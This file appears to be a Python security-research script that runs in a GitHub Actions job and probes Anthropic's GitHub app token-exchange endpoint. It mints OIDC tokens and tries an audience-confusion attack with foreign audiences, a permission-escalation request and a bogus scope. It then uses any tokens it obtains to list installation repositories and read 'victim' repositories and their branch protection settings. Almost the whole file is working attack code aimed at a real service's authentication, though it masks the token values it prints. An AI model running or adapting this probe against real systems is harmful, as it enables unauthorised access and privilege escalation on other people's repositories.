#!/usr/bin/env python3
"""ATT-2 exchange probe: characterize api.anthropic.com github-app-token-exchange.

Read-only, marker-only. Never prints token material; only len + sha256:8.
"""
import os, json, urllib.request, urllib.parse, urllib.error, hashlib, base64, sys

REQ_URL = os.environ.get("ACTIONS_ID_TOKEN_REQUEST_URL", "")
REQ_TOKEN = os.environ.get("ACTIONS_ID_TOKEN_REQUEST_TOKEN", "")
EXCHANGE = "https://api.anthropic.com/api/github/github-app-token-exchange"


def h8(s):
    return hashlib.sha256(s.encode()).hexdigest()[:8]


print("=== ATT2 exchange probe ===")
print("PROBE_TAG:", os.environ.get("PROBE_TAG", ""))
for k in ("GITHUB_EVENT_NAME", "GITHUB_REF", "GITHUB_HEAD_REF", "GITHUB_REPOSITORY",
          "GITHUB_WORKFLOW", "GITHUB_JOB"):
    print(f"{k}: {os.environ.get(k, '')}")
print(f"REQ_URL present: {bool(REQ_URL)}")
print(f"REQ_TOKEN present: {bool(REQ_TOKEN)} len: {len(REQ_TOKEN)} sha256_8: {h8(REQ_TOKEN) if REQ_TOKEN else '-'}")
sys.stdout.flush()


def get_id_token(aud):
    sep = "&" if "?" in REQ_URL else "?"
    url = REQ_URL + sep + "audience=" + urllib.parse.quote(aud)
    r = urllib.request.Request(url, headers={"Authorization": "Bearer " + REQ_TOKEN})
    with urllib.request.urlopen(r, timeout=30) as resp:
        return json.load(resp)["value"]


def claims(jwt):
    p = jwt.split(".")[1]
    p += "=" * (-len(p) % 4)
    return json.loads(base64.urlsafe_b64decode(p))


CLAIM_KEYS = ["repository", "workflow_ref", "workflow_sha", "job_workflow_ref",
              "job_workflow_sha", "ref", "ref_type", "event_name", "actor",
              "run_id", "aud", "sub", "head_ref", "base_ref", "repository_owner"]


def show_claims(jwt, label):
    c = claims(jwt)
    print(f"CLAIMS[{label}]:", json.dumps({k: c.get(k) for k in CLAIM_KEYS if k in c}))
    sys.stdout.flush()


def exchange(idt, body=None, label=""):
    req = urllib.request.Request(
        EXCHANGE,
        data=(json.dumps(body).encode() if body is not None else None),
        headers={"Authorization": "Bearer " + idt, "Accept": "application/json",
                 **({"Content-Type": "application/json"} if body is not None else {})},
        method="POST")
    tok = None
    try:
        with urllib.request.urlopen(req, timeout=30) as resp:
            status = resp.status
            try:
                data = json.load(resp)
            except Exception:
                data = {"raw": resp.read().decode()[:500]}
    except urllib.error.HTTPError as e:
        status = e.code
        try:
            data = json.loads(e.read().decode())
        except Exception as e2:
            data = {"raw": str(e2)}
    out = {"status": status}
    if isinstance(data, dict):
        d = dict(data)
        tok = d.pop("token", None) or d.pop("app_token", None)
        if tok:
            out["token"] = {"present": True, "len": len(tok), "sha256_8": h8(tok)}
        out["body"] = d
    else:
        out["body"] = str(data)[:500]
    print(f"EXCHANGE[{label}] ->", json.dumps(out))
    sys.stdout.flush()
    return status, data if isinstance(data, dict) else {}, tok


def gh_get(path, tok, label):
    req = urllib.request.Request(
        "https://api.github.com" + path,
        headers={"Authorization": "Bearer " + tok,
                 "Accept": "application/vnd.github+json",
                 "X-GitHub-Api-Version": "2022-11-28"})
    try:
        with urllib.request.urlopen(req, timeout=30) as resp:
            body = resp.read()
            print(f"GET[{label}] {path} -> {resp.status} "
                  f"x-oauth-scopes={resp.headers.get('x-oauth-scopes')!r} "
                  f"x-accepted-scopes={resp.headers.get('x-accepted-scopes')!r} "
                  f"len={len(body)}")
            sys.stdout.flush()
            return resp.status, body
    except urllib.error.HTTPError as e:
        body = e.read()
        print(f"GET[{label}] {path} -> {e.code} len={len(body)}")
        sys.stdout.flush()
        return e.code, body


# ---------- T1: baseline exchange (aud=claude-code-github-action) ----------
idt = get_id_token("claude-code-github-action")
print("ID_TOKEN len:", len(idt), "sha256_8:", h8(idt))
show_claims(idt, "baseline")
st, data, tok = exchange(idt, None, "baseline")

if tok:
    s, body = gh_get("/installation/repositories", tok, "baseline")
    if s == 200:
        try:
            j = json.loads(body)
            print("INSTALLATION_REPOS total_count:", j.get("total_count"),
                  "repos:", [r.get("full_name") for r in j.get("repositories", [])])
        except Exception as e:
            print("parse err", e)
        sys.stdout.flush()
    for p in ["/repos/N0tre3l/cca-fork-e2e-victim",
              "/repos/N0tre3l/poc-victim",
              "/repos/iraqihack/settings-e2e-test",
              "/repos/N0tre3l/cca-fork-e2e-victim/actions/workflows",
              "/repos/N0tre3l/cca-fork-e2e-victim/branches/main/protection"]:
        gh_get(p, tok, "baseline")

# ---------- T2: audience confusion ----------
for aud in ["https://api.anthropic.com", "api://AzureADTokenExchange", "https://example.invalid/att2"]:
    try:
        idt2 = get_id_token(aud)
        show_claims(idt2, "aud=" + aud)
        exchange(idt2, None, "aud=" + aud)
    except Exception as e:
        print(f"AUD_MINT[{aud}] FAILED: {type(e).__name__}: {e}")
        sys.stdout.flush()

# ---------- T3: permission-escalation body ----------
idt3 = get_id_token("claude-code-github-action")
st3, data3, tok3 = exchange(idt3, {"permissions": {"actions": "read", "administration": "read"}},
                            "perm-escalate")
if tok3:
    gh_get("/repos/N0tre3l/cca-fork-e2e-victim/actions/workflows", tok3, "perm-escalate")
    gh_get("/repos/N0tre3l/cca-fork-e2e-victim/branches/main/protection", tok3, "perm-escalate")
    gh_get("/installation/repositories", tok3, "perm-escalate")

# ---------- T4: unknown permission key ----------
idt4 = get_id_token("claude-code-github-action")
exchange(idt4, {"permissions": {"totally_bogus_scope": "write"}}, "perm-bogus")

# ---------- T5: cross-audience OIDC token minted for WIF-style audience, exchange anyway done in T2 ----------
print("=== probe done ===")
